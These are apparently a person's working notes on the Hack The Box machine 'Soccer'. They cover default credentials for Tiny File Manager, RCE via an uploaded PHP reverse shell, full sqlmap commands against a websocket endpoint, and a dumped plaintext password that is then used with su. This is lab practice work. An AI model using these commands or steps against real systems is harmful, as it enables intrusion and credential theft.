# Soccer

### Findings so far are:

1.http://soccer.htb/
  This findings is added to the /etc/hosts file and allows navigation to the site via the host-name
  ``` $IP soccer.htb ```

1.1 fuff scan of the website found directory `/tiny`
  1.1a The directory is seen to be a file manager
       Inspecting the source code shows the filemanager is `Tiny File Manager 2.4.3`
       Online search show Authenticated RCE possible via file arbitrary file upload to the upload directory
       Online search also shows defualt credentials `admin:admin@123`

1.2 The upload function results in RCE via uploading php reverse shell in the uploads directory GUI 
  1.2a The looking around the host shows a user player which is not accessible
  1.2b Looking around also shows vhost in the /etc/hosts file: `soc-player.soccer.htb`

2.soc-player.soccer.htb shows a page `soc-player.soccer.htb/check` upon login 
   2.1 Inspection of the page source code shows ws url `ws://soc-player.soccer.htb:9091`
   

[STUCK]

3.SqlMap needed to enumerate datbase on the server
  3.1 `sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3`
  3.2 `sqlmap -u ws://soc-player.soccer.htb:9091 --dbs --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10` Yields databases:
  ```sh
  available databases [5]:
  [*] information_schema
  [*] mysql
  [*] performance_schema
  [*] soccer_db
  [*] sys
  ```
  3.3 `sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db --tables --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10` shows table: accounts
  ```sh
  Database: soccer_db
  [1 table]
  +----------+
  | accounts |
  +----------+
  
  ```
  3.4 `sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db -T accounts --dump --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10`
  ```
  Database: soccer_db
  Table: accounts
  [1 entry]
  +------+-------------------+----------------------+----------+
  | id   | email             | password             | username |
  +------+-------------------+----------------------+----------+
  | 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
  +------+-------------------+----------------------+----------+  
  ```

4. Password reuse detected, `player@player.htb` password was reused on the player user
  4.1 \[S\]witch \[U\]ser `su player`
  4.2 navigating to home directory yeilds: user flag `user.txt`

x.nginx/1.18.0 (Ubuntu)
  Server version disclosure

#### Actions done so far:
- [x] Nmap scan
- [x] fuff fuzzing
- [x] Manual inspection of soccer.htb
- [x] Manual inspection of soccer.htb/tiny
- [ ] Exploit search for Tiny file manager 2.4.3
    - [x] exploitdb search
    - [x] Google search
    - [ ] Metasploit search
- [ ] SqlMap Websocket url
